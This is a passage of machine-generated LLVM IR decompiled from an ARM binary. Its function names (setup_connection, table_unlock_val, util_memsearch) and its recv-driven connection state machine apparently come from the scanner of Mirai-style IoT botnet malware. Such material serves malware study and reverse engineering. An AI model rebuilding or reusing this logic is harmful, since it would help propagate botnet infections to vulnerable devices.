  %v0_10bfc.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10bfc.pr.pr, label %bb378, label %dec_label_pc_10c00

dec_label_pc_10c00:                               ; preds = %dec_label_pc_10bdc, %.thread56
  %v0_10c00 = load i32, i32* @r4, align 4
  store i32 %v0_10c00, i32* @r0, align 4
  %v0_10c04 = call i32 @setup_connection()
  store i32 %v0_10c04, i32* %r0.global-to-local, align 4
  br label %bb378

dec_label_pc_10c0c:                               ; preds = %bb378
  store i32 0, i32* @r4, align 4
  store i32 1, i32* %stack_var_-68, align 4
  %v0_10c18 = load i32, i32* @r5, align 4
  %v1_10c18 = load i32, i32* @r6, align 4
  %v3_10c18 = icmp uge i32 %v0_10c18, %v1_10c18
  store i1 %v3_10c18, i1* %cpsr_c.global-to-local, align 1
  %v9_10c18 = icmp eq i32 %v0_10c18, %v1_10c18
  store i1 %v9_10c18, i1* %cpsr_z.global-to-local, align 1
  %v5_10c1c = icmp slt i32 %v0_10c18, %v1_10c18
  %storemerge134 = select i1 %v5_10c1c, i32 %v1_10c18, i32 %v0_10c18
  %v2_10c28 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_10c28, i32* %ip.global-to-local, align 4
  %v2_10c2c = ptrtoint i32* %stack_var_-224 to i32
  store i32 %v2_10c2c, i32* %r1.global-to-local, align 4
  %v2_10c30 = ptrtoint i32* %stack_var_-352 to i32
  store i32 %v2_10c30, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10c38 = add i32 %storemerge134, 1
  store i32 %v1_10c38, i32* %r0.global-to-local, align 4
  %v5_10c44 = call i32 @__libc_select(i32 %v1_10c38, i32 %v2_10c2c, i32 %v2_10c30, i32 0, i32 %v2_10c28)
  %v0_10c48 = load i32, i32* @r4, align 4
  store i32 %v0_10c48, i32* %r0.global-to-local, align 4
  %v1_10c4c = inttoptr i32 %v0_10c48 to i32*
  %v2_10c4c = call i32 @__GI_time(i32* %v1_10c4c)
  store i32 %v2_10c4c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_246f0.163 to i32), i32* @lr, align 4
  %v0_10c54 = load i32, i32* @r4, align 4
  %v5_10c54 = trunc i32 %v0_10c54 to i16
  store i16 %v5_10c54, i16* %stack_var_-52, align 2
  store i32 %v2_10c4c, i32* @global_var_246f0.163, align 4
  %v2_11570 = ptrtoint i32* %stack_var_-45 to i32
  %v2_11584 = ptrtoint i32* %stack_var_-80 to i32
  %v2_1158c = ptrtoint i32* %stack_var_-77 to i32
  %v2_11340 = ptrtoint i32* %stack_var_-60 to i32
  %v2_11354 = ptrtoint i8* %stack_var_-56 to i32
  %v2_1135c = bitcast i8* %stack_var_-56 to i32*
  %v2_1167c = ptrtoint i32* %stack_var_-96 to i32
  br label %dec_label_pc_10c5c

dec_label_pc_10c5c:                               ; preds = %dec_label_pc_10dd0, %dec_label_pc_10c0c
  %v0_10c68 = phi i32 [ %v1_10dd4, %dec_label_pc_10dd0 ], [ %v0_10c54, %dec_label_pc_10c0c ]
  store i32 ptrtoint (i32* @global_var_271d0.174 to i32), i32* %r0.global-to-local, align 4
  %v3_10c60 = mul i32 %v0_10c68, 256
  store i32 %v3_10c60, i32* %r3.global-to-local, align 4
  %v2_10c64 = load i32, i32* @global_var_271d0.174, align 4
  store i32 %v2_10c64, i32* %r1.global-to-local, align 4
  %v2_10c6c = mul i32 %v0_10c68, 288
  store i32 %v2_10c6c, i32* %r2.global-to-local, align 4
  %v2_10c70 = add i32 %v2_10c64, %v2_10c6c
  store i32 %v2_10c70, i32* @r5, align 4
  %v1_10c74 = add i32 %v2_10c70, 4
  %v2_10c74 = inttoptr i32 %v1_10c74 to i32*
  %v3_10c74 = load i32, i32* %v2_10c74, align 4
  store i32 %v3_10c74, i32* %r0.global-to-local, align 4
  %v2_10c78 = icmp eq i32 %v3_10c74, -1
  store i1 %v2_10c78, i1* %cpsr_c.global-to-local, align 1
  %v7_10c78 = icmp eq i32 %v3_10c74, -1
  store i1 %v7_10c78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10c78, label %dec_label_pc_10dd0, label %dec_label_pc_10c80

dec_label_pc_10c80:                               ; preds = %dec_label_pc_10c5c
  %v3_10c80 = udiv i32 %v3_10c74, 32
  store i32 %v2_11928, i32* %r1.global-to-local, align 4
  %v3_10c8c = mul nuw nsw i32 %v3_10c80, 4
  store i32 %v3_10c8c, i32* @ip, align 4
  %v2_10c90 = add i32 %v3_10c8c, %v2_11928
  store i32 %v2_10c90, i32* %r2.global-to-local, align 4
  %v1_10c94 = add i32 %v2_10c90, -312
  %v2_10c94 = inttoptr i32 %v1_10c94 to i32*
  %v3_10c94 = load i32, i32* %v2_10c94, align 4
  %v1_10c98 = urem i32 %v3_10c74, 32
  store i32 %v1_10c98, i32* %r1.global-to-local, align 4
  %v2_10c9c = add nsw i32 %v1_10c98, -1
  %v3_10c9c = shl i32 1, %v2_10c9c
  %v4_10c9c = and i32 %v3_10c94, %v3_10c9c
  %v5_10c9c = icmp ne i32 %v4_10c9c, 0
  store i1 %v5_10c9c, i1* %cpsr_c.global-to-local, align 1
  %v6_10c9c = ashr i32 %v3_10c94, %v1_10c98
  store i32 %v6_10c9c, i32* %r3.global-to-local, align 4
  %v1_10ca0 = urem i32 %v6_10c9c, 2
  %v2_10ca0 = icmp eq i32 %v1_10ca0, 0
  store i1 %v2_10ca0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10ca0, label %dec_label_pc_10ca8, label %dec_label_pc_11760

dec_label_pc_10ca8:                               ; preds = %dec_label_pc_10c80, %dec_label_pc_11810
  %v1_10cb8 = phi i32 [ %v1_10c98, %dec_label_pc_10c80 ], [ %v1_10cb8.pre, %dec_label_pc_11810 ]
  %v0_10cb0 = phi i32 [ %v3_10c8c, %dec_label_pc_10c80 ], [ %v0_10cb0.pre, %dec_label_pc_11810 ]
  store i32 %v2_11928, i32* %r3.global-to-local, align 4
  %v2_10cb0 = add i32 %v0_10cb0, %v2_11928
  store i32 %v2_10cb0, i32* %r2.global-to-local, align 4
  %v1_10cb4 = add i32 %v2_10cb0, -184
  %v2_10cb4 = inttoptr i32 %v1_10cb4 to i32*
  %v3_10cb4 = load i32, i32* %v2_10cb4, align 4
  %v2_10cb8 = add i32 %v1_10cb8, -1
  %v3_10cb8 = shl i32 1, %v2_10cb8
  %v4_10cb8 = and i32 %v3_10cb4, %v3_10cb8
  %v5_10cb8 = icmp ne i32 %v4_10cb8, 0
  store i1 %v5_10cb8, i1* %cpsr_c.global-to-local, align 1
  %v6_10cb8 = ashr i32 %v3_10cb4, %v1_10cb8
  store i32 %v6_10cb8, i32* %r3.global-to-local, align 4
  %v1_10cbc = urem i32 %v6_10cb8, 2
  %v2_10cbc = icmp eq i32 %v1_10cbc, 0
  store i1 %v2_10cbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10cbc, label %dec_label_pc_10dd0, label %dec_label_pc_10cc4.preheader

dec_label_pc_10cc4.preheader:                     ; preds = %dec_label_pc_10ca8
  %v0_10cc4156 = load i32, i32* @r5, align 4
  %v1_10cc4157 = add i32 %v0_10cc4156, 12
  %v2_10cc4158 = inttoptr i32 %v1_10cc4157 to i32*
  %v3_10cc4159 = load i32, i32* %v2_10cc4158, align 4
  store i32 %v3_10cc4159, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10cc8155161 = icmp eq i32 %v3_10cc4159, 0
  store i1 %v2_10cc8155161, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10cc8155161, label %dec_label_pc_10dd0, label %dec_label_pc_10cd0.lr.ph

dec_label_pc_10cc4.loopexit:                      ; preds = %dec_label_pc_11620, %dec_label_pc_11490
  %v0_10cc4 = load i32, i32* @r5, align 4
  %v1_10cc4 = add i32 %v0_10cc4, 12
  %v2_10cc4 = inttoptr i32 %v1_10cc4 to i32*
  %v3_10cc4 = load i32, i32* %v2_10cc4, align 4
  store i32 %v3_10cc4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10cc8155 = icmp eq i32 %v3_10cc4, 0
  store i1 %v2_10cc8155, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10cc8155, label %dec_label_pc_10dd0, label %dec_label_pc_10cd0.lr.ph

dec_label_pc_10cd0.lr.ph:                         ; preds = %dec_label_pc_10cc4.preheader, %dec_label_pc_10cc4.loopexit
  %v0_10cd0189 = phi i32 [ %v0_10cc4, %dec_label_pc_10cc4.loopexit ], [ %v0_10cc4156, %dec_label_pc_10cc4.preheader ]
  br label %dec_label_pc_10cd0

dec_label_pc_10cd0:                               ; preds = %dec_label_pc_10cc8.backedge.thread, %dec_label_pc_10cc8.backedge, %dec_label_pc_10cc8.backedge.thread528, %dec_label_pc_10cd0.lr.ph
  %v0_116f0 = phi i32 [ %v0_10cd0189, %dec_label_pc_10cd0.lr.ph ], [ %v0_10cd0186, %dec_label_pc_10cc8.backedge ], [ %v0_10d44, %dec_label_pc_10cc8.backedge.thread ], [ %v0_10d44, %dec_label_pc_10cc8.backedge.thread528 ]
  %v1_10cd0 = add i32 %v0_116f0, 24
  %v2_10cd0 = inttoptr i32 %v1_10cd0 to i32*
  %v3_10cd0 = load i32, i32* %v2_10cd0, align 4
  store i32 %v3_10cd0, i32* @r3, align 4
  %v2_10cd4 = icmp ugt i32 %v3_10cd0, 255
  store i1 %v2_10cd4, i1* %cpsr_c.global-to-local, align 1
  %v7_10cd4 = icmp eq i32 %v3_10cd0, 256
  store i1 %v7_10cd4, i1* %cpsr_z.global-to-local, align 1
  %.pre = add i32 %v0_116f0, 28
  store i32 %.pre, i32* @sl, align 4
  br i1 %v7_10cd4, label %dec_label_pc_116f0, label %dec_label_pc_10ce0

dec_label_pc_10ce0:                               ; preds = %dec_label_pc_10cd0, %dec_label_pc_116f0
  store i32 0, i32* @r6, align 4
  %v1_10ce4 = load i32, i32* @sb, align 4
  %v2_10ce4 = inttoptr i32 %v1_10ce4 to i32*
  store i32 0, i32* %v2_10ce4, align 4
  %v0_10ce8 = load i32, i32* @r5, align 4
  %v1_10ce8 = add i32 %v0_10ce8, 24
  %v2_10ce8 = inttoptr i32 %v1_10ce8 to i32*
  %v3_10ce8 = load i32, i32* %v2_10ce8, align 4
  store i32 %v3_10ce8, i32* %r2.global-to-local, align 4
  %v0_10cec = load i32, i32* @sl, align 4
  %v2_10cec = add i32 %v0_10cec, %v3_10ce8
  store i32 %v2_10cec, i32* @r4, align 4
  %v1_10cf0 = add i32 %v0_10ce8, 4
  %v2_10cf0 = inttoptr i32 %v1_10cf0 to i32*
  %v3_10cf0 = load i32, i32* %v2_10cf0, align 4
  store i32 %v3_10cf0, i32* %r0.global-to-local, align 4
  %v1_10cf4 = sub i32 256, %v3_10ce8
  store i32 %v1_10cf4, i32* %r2.global-to-local, align 4
  store i32 %v2_10cec, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_10d00 = call i32 @__libc_recv(i32 %v3_10cf0, i32 %v2_10cec, i32 %v1_10cf4, i32 16384)
  store i32 %v4_10d00, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10d04 = icmp eq i32 %v4_10d00, 0
  store i1 %v2_10d04, i1* %cpsr_z.global-to-local, align 1
  %tmp385 = icmp slt i32 %v4_10d00, 1
  br i1 %tmp385, label %dec_label_pc_10d7c, label %dec_label_pc_10d0c

dec_label_pc_10d0c:                               ; preds = %dec_label_pc_10ce0
  %v0_10d0c = load i32, i32* @r6, align 4
  store i32 %v0_10d0c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10d10

dec_label_pc_10d10:                               ; preds = %.thread63, %dec_label_pc_10d0c
  %v3_10d1c = phi i32 [ %v1_10d20, %.thread63 ], [ %v0_10d0c, %dec_label_pc_10d0c ]
  %v1_10d10 = load i32, i32* @r4, align 4
  %v2_10d10 = add i32 %v1_10d10, %v3_10d1c
  %v3_10d10 = inttoptr i32 %v2_10d10 to i8*
  %v4_10d10 = load i8, i8* %v3_10d10, align 1
  %v6_10d10 = zext i8 %v4_10d10 to i32
  store i32 %v6_10d10, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10d14 = icmp eq i8 %v4_10d10, 0
  store i1 %v2_10d14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10d14, label %bb386, label %.thread63

bb386:                                            ; preds = %dec_label_pc_10d10
  %v2_10d18 = add nuw nsw i32 %v6_10d10, 65
  store i32 %v2_10d18, i32* %r3.global-to-local, align 4
  %v2_10d1c = trunc i32 %v2_10d18 to i8
  store i8 %v2_10d1c, i8* %v3_10d10, align 1
  %v0_10d20.pre = load i32, i32* %r2.global-to-local, align 4
  br label %.thread63

.thread63:                                        ; preds = %dec_label_pc_10d10, %bb386
  %v0_10d20 = phi i32 [ %v3_10d1c, %dec_label_pc_10d10 ], [ %v0_10d20.pre, %bb386 ]
  %v1_10d20 = add i32 %v0_10d20, 1
  store i32 %v1_10d20, i32* %r2.global-to-local, align 4
  %v3_10d24 = icmp uge i32 %v1_10d20, %v4_10d00
  store i1 %v3_10d24, i1* %cpsr_c.global-to-local, align 1
  %v9_10d24 = icmp eq i32 %v1_10d20, %v4_10d00
  store i1 %v9_10d24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_10d24, label %dec_label_pc_10d2c, label %dec_label_pc_10d10

dec_label_pc_10d2c:                               ; preds = %.thread63, %dec_label_pc_10d80
  store i32 ptrtoint (i32* @global_var_246f0.163 to i32), i32* @ip, align 4
  %v0_10d30 = load i32, i32* @r5, align 4
  %v1_10d30 = add i32 %v0_10d30, 24
  %v2_10d30 = inttoptr i32 %v1_10d30 to i32*
  %v3_10d30 = load i32, i32* %v2_10d30, align 4
  %v2_10d34 = load i32, i32* @global_var_246f0.163, align 4
  store i32 %v2_10d34, i32* %r2.global-to-local, align 4
  %v2_10d38 = add i32 %v3_10d30, %v4_10d00
  store i32 %v2_10d38, i32* %r3.global-to-local, align 4
  store i32 %v2_10d38, i32* %v2_10d30, align 4
  %v0_10d40 = load i32, i32* %r2.global-to-local, align 4
  %v1_10d40 = load i32, i32* @r5, align 4
  %v2_10d40 = add i32 %v1_10d40, 8
  %v3_10d40 = inttoptr i32 %v2_10d40 to i32*
  store i32 %v0_10d40, i32* %v3_10d40, align 4
  br label %dec_label_pc_10d44

dec_label_pc_10d44:                               ; preds = %dec_label_pc_10e64, %dec_label_pc_10d2c
  %v0_10d44 = load i32, i32* @r5, align 4
  %v1_10d44 = add i32 %v0_10d44, 12
  %v2_10d44 = inttoptr i32 %v1_10d44 to i32*
  %v3_10d44 = load i32, i32* %v2_10d44, align 4
  store i32 %v3_10d44, i32* %r0.global-to-local, align 4
  %v1_10d48 = add i32 %v3_10d44, -2
  store i32 %v1_10d48, i32* @r3, align 4
  %v7_10d4c = icmp eq i32 %v1_10d48, 8
  store i1 %v7_10d4c, i1* %cpsr_z.global-to-local, align 1
  %v5_10d50 = and i32 %v1_10d48, 1073741824
  %v6_10d50 = icmp ne i32 %v5_10d50, 0
  store i1 %v6_10d50, i1* %cpsr_c.global-to-local, align 1
  switch i32 %v3_10d44, label %dec_label_pc_10cc8.backedge [
    i32 2, label %dec_label_pc_1149c
    i32 3, label %dec_label_pc_112b0
    i32 4, label %dec_label_pc_113a8
    i32 5, label %dec_label_pc_111dc
    i32 6, label %dec_label_pc_11034
    i32 7, label %dec_label_pc_10f60
    i32 8, label %dec_label_pc_11108
    i32 9, label %dec_label_pc_10e8c
    i32 10, label %dec_label_pc_10de8
  ]

dec_label_pc_10d7c:                               ; preds = %dec_label_pc_10ce0
  br i1 %v2_10d04, label %dec_label_pc_1190c, label %dec_label_pc_10d80

dec_label_pc_10d80:                               ; preds = %dec_label_pc_10d7c
  %v3_10d80 = icmp eq i32 %v4_10d00, -1
  store i1 %v3_10d80, i1* %cpsr_c.global-to-local, align 1
  %v8_10d80 = icmp eq i32 %v4_10d00, -1
  store i1 %v8_10d80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_10d80, label %dec_label_pc_10d88, label %dec_label_pc_10d2c

dec_label_pc_10d88:                               ; preds = %dec_label_pc_10d80
  %v0_10d88 = load i32, i32* @sb, align 4
  %v1_10d88 = inttoptr i32 %v0_10d88 to i32*
  %v2_10d88 = load i32, i32* %v1_10d88, align 4
  store i32 %v2_10d88, i32* %r3.global-to-local, align 4
  %v2_10d8c = icmp ugt i32 %v2_10d88, 10
  store i1 %v2_10d8c, i1* %cpsr_c.global-to-local, align 1
  %v7_10d8c = icmp eq i32 %v2_10d88, 11
  store i1 %v7_10d8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10d8c, label %dec_label_pc_10dd0, label %dec_label_pc_10d94

dec_label_pc_10d94:                               ; preds = %dec_label_pc_10d88, %dec_label_pc_1190c
  %v0_10d94 = load i32, i32* @r5, align 4
  %v1_10d94 = add i32 %v0_10d94, 4
  %v2_10d94 = inttoptr i32 %v1_10d94 to i32*
  %v3_10d94 = load i32, i32* %v2_10d94, align 4
  store i32 %v3_10d94, i32* %r0.global-to-local, align 4
  %v1_10d98 = call i32 @__GI___libc_close(i32 %v3_10d94)
  store i32 %v1_10d98, i32* %r0.global-to-local, align 4
  %v0_10d9c = load i32, i32* @r5, align 4
  %v1_10d9c = add i32 %v0_10d9c, 284
  %v2_10d9c = inttoptr i32 %v1_10d9c to i8*
  %v3_10d9c = load i8, i8* %v2_10d9c, align 1
  %v4_10d9c = zext i8 %v3_10d9c to i32
  %v1_10da0 = add nuw nsw i32 %v4_10d9c, 1
  %v1_10da4 = urem i32 %v1_10da0, 256
  store i32 %v1_10da4, i32* %r3.global-to-local, align 4
  %v2_10da8 = icmp ugt i32 %v1_10da4, 8
  store i1 %v2_10da8, i1* %cpsr_c.global-to-local, align 1
  %v7_10da8 = icmp eq i32 %v1_10da4, 9
  store i1 %v7_10da8, i1* %cpsr_z.global-to-local, align 1
  %v1_10dac = trunc i32 %v1_10da0 to i8
  store i8 %v1_10dac, i8* %v2_10d9c, align 1
  %v0_10db0 = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_10db0 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v2_10db0 = xor i1 %v1_10db0, true
  %v3_10db0 = and i1 %v0_10db0, %v2_10db0
  br i1 %v3_10db0, label %bb387, label %.thread293

.thread293:                                       ; preds = %dec_label_pc_10d94
  store i32 -1, i32* %r2.global-to-local, align 4
  %v1_10dbc289294 = load i32, i32* @r5, align 4
  %v2_10dbc290295 = add i32 %v1_10dbc289294, 4
  %v3_10dbc291296 = inttoptr i32 %v2_10dbc290295 to i32*
  store i32 -1, i32* %v3_10dbc291296, align 4
  br label %bb388

bb387:                                            ; preds = %dec_label_pc_10d94
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10dbc285 = load i32, i32* @r5, align 4
  %v2_10dbc286 = add i32 %v1_10dbc285, 4
  %v3_10dbc287 = inttoptr i32 %v2_10dbc286 to i32*
  store i32 -1, i32* %v3_10dbc287, align 4
  %v4_10dc0 = load i32, i32* %r0.global-to-local, align 4
  %v5_10dc0 = load i32, i32* @r5, align 4
  %v6_10dc0 = add i32 %v5_10dc0, 12
  %v7_10dc0 = inttoptr i32 %v6_10dc0 to i32*
  store i32 %v4_10dc0, i32* %v7_10dc0, align 4
  %v4_10dc4 = load i32, i32* %r3.global-to-local, align 4
  %v5_10dc4 = trunc i32 %v4_10dc4 to i8
  %v6_10dc4 = load i32, i32* @r5, align 4
  %v7_10dc4 = add i32 %v6_10dc4, 284
  %v8_10dc4 = inttoptr i32 %v7_10dc4 to i8*
  store i8 %v5_10dc4, i8* %v8_10dc4, align 1
  %v0_10dc8.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_10dc8.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb388

bb388:                                            ; preds = %.thread293, %bb387
  %v1_10dcc = phi i1 [ %v1_10dc8.pre, %bb387 ], [ %v0_10db0, %.thread293 ]
  %v0_10dcc = phi i1 [ %v0_10dc8.pre, %bb387 ], [ %v1_10db0, %.thread293 ]
  %v2_10dc8 = xor i1 %v1_10dcc, true
  %v3_10dc8 = or i1 %v0_10dcc, %v2_10dc8
  br i1 %v3_10dc8, label %bb389, label %bb390

bb389:                                            ; preds = %bb388
  %v4_10dc8 = load i32, i32* @r5, align 4
  store i32 %v4_10dc8, i32* %r0.global-to-local, align 4
  br label %bb390

bb390:                                            ; preds = %bb388, %bb389
  store i32 69072, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10dc8, i32 ptrtoint (i32* @global_var_f384.540 to i32))
  br label %dec_label_pc_10dd0

dec_label_pc_10dd0:                               ; preds = %dec_label_pc_10cc4.loopexit, %dec_label_pc_10cc8.backedge, %dec_label_pc_10cc4.preheader, %dec_label_pc_10d88, %dec_label_pc_10ca8, %dec_label_pc_10c5c, %dec_label_pc_11830, %bb390
  %v3_10dd0 = load i16, i16* %stack_var_-52, align 2
  %v4_10dd0 = sext i16 %v3_10dd0 to i32
  store i32 %v4_10dd0, i32* %r3.global-to-local, align 4
  %v1_10dd4 = add nsw i32 %v4_10dd0, 1
  store i32 %v1_10dd4, i32* @r4, align 4
  %v2_10dd8 = icmp ugt i32 %v1_10dd4, 254
  store i1 %v2_10dd8, i1* %cpsr_c.global-to-local, align 1
  %v7_10dd8 = icmp eq i32 %v1_10dd4, 255
  store i1 %v7_10dd8, i1* %cpsr_z.global-to-local, align 1
  %v5_10ddc = trunc i32 %v1_10dd4 to i16
  store i16 %v5_10ddc, i16* %stack_var_-52, align 2
  %v7_10de0 = icmp sgt i16 %v3_10dd0, 254
  br i1 %v7_10de0, label %dec_label_pc_10690, label %dec_label_pc_10c5c

dec_label_pc_10de8:                               ; preds = %dec_label_pc_10d44
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_10dec = call i32 @table_unlock_val(i32 30)
  store i32 %v2_11354, i32* %r1.global-to-local, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v3_10dfc = call i32 @table_retrieve_val(i32 30, i32* %v2_1135c)
  %v3_10e00 = load i8, i8* %stack_var_-56, align 1
  %v4_10e00 = sext i8 %v3_10e00 to i32
  store i32 %v3_10dfc, i32* %r2.global-to-local, align 4
  %v1_10e08 = add nsw i32 %v4_10e00, -1
  store i32 %v1_10e08, i32* %r3.global-to-local, align 4
  %v0_10e0c = load i32, i32* @sl, align 4
  store i32 %v0_10e0c, i32* %r0.global-to-local, align 4
  %v0_10e10 = load i32, i32* @r5, align 4
  %v1_10e10 = add i32 %v0_10e10, 24
  %v2_10e10 = inttoptr i32 %v1_10e10 to i32*
  %v3_10e10 = load i32, i32* %v2_10e10, align 4
  store i32 %v3_10e10, i32* %r1.global-to-local, align 4
  %v4_10e14 = call i32 @util_memsearch(i32 %v0_10e0c, i32 %v3_10e10, i32 %v3_10dfc, i32 %v1_10e08)
  %v2_10e18 = icmp eq i32 %v4_10e14, -1
  store i1 %v2_10e18, i1* %cpsr_c.global-to-local, align 1
  %v7_10e18 = icmp eq i32 %v4_10e14, -1
  store i1 %v7_10e18, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_10e14, i32* @r4, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_11624 = call i32 @table_lock_val(i32 30)
  br i1 %v7_10e18, label %dec_label_pc_11620, label %dec_label_pc_10e24

dec_label_pc_10e24:                               ; preds = %dec_label_pc_10de8
  store i32 %v1_11624, i32* %r0.global-to-local, align 4
  %v0_10e2c = load i32, i32* @r5, align 4
  %v1_10e2c = add i32 %v0_10e2c, 4
  %v2_10e2c = inttoptr i32 %v1_10e2c to i32*
  %v3_10e2c = load i32, i32* %v2_10e2c, align 4
  store i32 %v3_10e2c, i32* %r0.global-to-local, align 4
  %v1_10e30 = call i32 @__GI___libc_close(i32 %v3_10e2c)
  store i32 %v1_10e30, i32* %r0.global-to-local, align 4
  %v0_10e34 = load i32, i32* @r5, align 4
  %v1_10e34 = add i32 %v0_10e34, 284
  %v2_10e34 = inttoptr i32 %v1_10e34 to i8*
  %v3_10e34 = load i8, i8* %v2_10e34, align 1
  %v4_10e34 = zext i8 %v3_10e34 to i32
  %v1_10e38 = add nuw nsw i32 %v4_10e34, 1
  %v1_10e3c = urem i32 %v1_10e38, 256
  store i32 %v1_10e3c, i32* @r3, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_10e44 = icmp ugt i32 %v1_10e3c, 9
  store i1 %v2_10e44, i1* %cpsr_c.global-to-local, align 1
  %v7_10e44 = icmp eq i32 %v1_10e3c, 10
  store i1 %v7_10e44, i1* %cpsr_z.global-to-local, align 1
  %v2_10e48 = add i32 %v0_10e34, 4
  %v3_10e48 = inttoptr i32 %v2_10e48 to i32*
  store i32 -1, i32* %v3_10e48, align 4
  %v0_10e4c = load i32, i32* @r3, align 4
  %v1_10e4c = trunc i32 %v0_10e4c to i8
  %v2_10e4c = load i32, i32* @r5, align 4
  %v3_10e4c = add i32 %v2_10e4c, 284
  %v4_10e4c = inttoptr i32 %v3_10e4c to i8*
  store i8 %v1_10e4c, i8* %v4_10e4c, align 1
  %v0_10e50 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10e50, label %dec_label_pc_10e54, label %dec_label_pc_11714

dec_label_pc_10e54:                               ; preds = %dec_label_pc_10e24
  store i32 0, i32* @r3, align 4
  %v1_10e58 = load i32, i32* @r5, align 4
  %v2_10e58 = add i32 %v1_10e58, 12
  %v3_10e58 = inttoptr i32 %v2_10e58 to i32*
  store i32 0, i32* %v3_10e58, align 4
  %v0_10e5c = load i32, i32* @r3, align 4
  %v1_10e5c = trunc i32 %v0_10e5c to i8
  %v2_10e5c = load i32, i32* @r5, align 4
  %v3_10e5c = add i32 %v2_10e5c, 284
  %v4_10e5c = inttoptr i32 %v3_10e5c to i8*
  store i8 %v1_10e5c, i8* %v4_10e5c, align 1
  br label %dec_label_pc_10e60

dec_label_pc_10e60:                               ; preds = %dec_label_pc_11714, %dec_label_pc_10e54
  store i32 -1, i32* @r7, align 4
  br label %dec_label_pc_10e64

dec_label_pc_10e64:                               ; preds = %dec_label_pc_11490, %dec_label_pc_11258, %dec_label_pc_11184, %dec_label_pc_110b0, %dec_label_pc_10fdc, %dec_label_pc_10f08, %dec_label_pc_10e60
  %v0_10e64 = load i32, i32* @r5, align 4
  %v1_10e64 = add i32 %v0_10e64, 24
  %v2_10e64 = inttoptr i32 %v1_10e64 to i32*
  %v3_10e64 = load i32, i32* %v2_10e64, align 4
  %v0_10e68 = load i32, i32* @r7, align 4
  %v2_10e68 = sub i32 %v0_10e68, %v3_10e64
  %v3_10e68 = icmp uge i32 %v0_10e68, %v3_10e64
  store i1 %v3_10e68, i1* %cpsr_c.global-to-local, align 1
  %v4_10e68 = xor i32 %v0_10e68, %v3_10e64
  %v5_10e68 = xor i32 %v2_10e68, %v0_10e68
  %v6_10e68 = and i32 %v5_10e68, %v4_10e68
  %v7_10e68 = icmp slt i32 %v6_10e68, 0
  %v8_10e68 = icmp slt i32 %v2_10e68, 0
  %v9_10e68 = icmp eq i32 %v0_10e68, %v3_10e64
  store i1 %v9_10e68, i1* %cpsr_z.global-to-local, align 1
  %v2_10e6c = xor i1 %v8_10e68, %v7_10e68
  %v0_10e68.v3_10e64 = select i1 %v2_10e6c, i32 %v0_10e68, i32 %v3_10e64
  store i32 %v0_10e68.v3_10e64, i32* %r1.global-to-local, align 4
  %v2_10e74 = sub i32 %v3_10e64, %v0_10e68.v3_10e64
  store i32 %v2_10e74, i32* @r2, align 4
  store i32 %v2_10e74, i32* %v2_10e64, align 4
  %v0_10e7c = load i32, i32* @sl, align 4
  %v1_10e7c = load i32, i32* %r1.global-to-local, align 4
  %v2_10e7c = add i32 %v1_10e7c, %v0_10e7c
  store i32 %v2_10e7c, i32* @r1, align 4
  store i32 %v0_10e7c, i32* @r0, align 4
  %v3_10e84 = call i32 @memmove(i32 %v0_10e7c, i32 %v2_10e7c, i32 %v2_10e74)
  store i32 %v3_10e84, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10d44

dec_label_pc_10e8c:                               ; preds = %dec_label_pc_10d44
  %v1_10e8c = add i32 %v0_10d44, 24
  %v2_10e8c = inttoptr i32 %v1_10e8c to i32*
  %v3_10e8c = load i32, i32* %v2_10e8c, align 4
  store i32 %v3_10e8c, i32* %r2.global-to-local, align 4
  %v1_10e90 = add i32 %v3_10e8c, -1
  store i32 %v1_10e90, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10e94 = icmp eq i32 %v1_10e90, 0
  store i1 %v2_10e94, i1* %cpsr_z.global-to-local, align 1
  %tmp393 = icmp slt i32 %v1_10e90, 1
  br i1 %tmp393, label %dec_label_pc_10cc8.backedge.thread, label %dec_label_pc_10e9c

dec_label_pc_10e9c:                               ; preds = %dec_label_pc_10e8c
  %v2_10e9c = add i32 %v1_10e90, %v0_10d44
  store i32 %v2_10e9c, i32* %r3.global-to-local, align 4
  %v1_10ea0 = add i32 %v2_10e9c, 28
  %v2_10ea0 = inttoptr i32 %v1_10ea0 to i8*
  %v3_10ea0 = load i8, i8* %v2_10ea0, align 1
  %v4_10ea0 = zext i8 %v3_10ea0 to i32
  store i32 %v4_10ea0, i32* %r3.global-to-local, align 4
  %v2_10ea4 = icmp ugt i8 %v3_10ea0, 61
